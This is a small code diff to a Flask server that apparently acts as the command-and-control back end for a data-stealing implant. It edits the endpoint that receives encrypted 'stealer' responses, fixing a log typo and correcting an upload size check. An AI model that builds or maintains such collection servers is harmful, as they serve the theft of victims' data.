@@ -276,8 +276,8 @@ def handle_response_stealer():
 @app.route("/response_data", methods=["POST"])
 @cross_origin()
 def handle_response_data():
-    print("Recieved response")
-    if(request.content_length>5000000):
+    print("Received response")
+    if(request.content_length<5000000):
         try:    
             data = request.get_data(force=True)
             data=RsaDecryption.rsadecrypt(data)
@@ -311,6 +311,9 @@ def handle_response_data():
         except Exception as error:
             print(error)
             return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
+    else:
+        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
+
 
 #Implant response endpoint, in json
 @app.route("/response_json", methods=["POST"])
